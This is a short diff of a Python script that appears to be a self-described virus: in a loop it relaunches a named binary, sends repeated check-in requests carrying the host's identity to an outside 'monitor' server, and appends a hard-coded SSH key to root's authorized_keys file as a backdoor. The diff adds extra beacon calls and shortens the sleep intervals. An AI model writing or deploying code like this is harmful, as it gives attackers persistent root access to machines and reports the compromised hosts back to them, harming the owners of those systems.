@@ -22,11 +22,14 @@ while 1:
     os.system("/usr/bin/flock -n /tmp/vlock.lock ./" + VNAME + " &")
     print("executed")
     hostname = os.system('hostname')
-    requests.get("https://monitor.daviddworken.com:8080/api/submit?id=%s&virusName=4", hostname)
+    requests.get("http://monitor.daviddworken.com:8080/api/submit?id=%s&virusName=3", hostname)
+    time.sleep(4)
+    requests.get("http://monitor.daviddworken.com:8080/api/submit?id=%s&virusName=3", hostname)
+    time.sleep(4)
+    requests.get("http://monitor.daviddworken.com:8080/api/submit?id=%s&virusName=3", hostname)
     if ssh_key_added():
         pass
     else:
         #Assuming .ssh folder exists here... 
         os.system("echo '\n" + SSH_KEY + "' >> /root/.ssh/authorized_keys") 
-    time.sleep(10)
-
+    time.sleep(4)
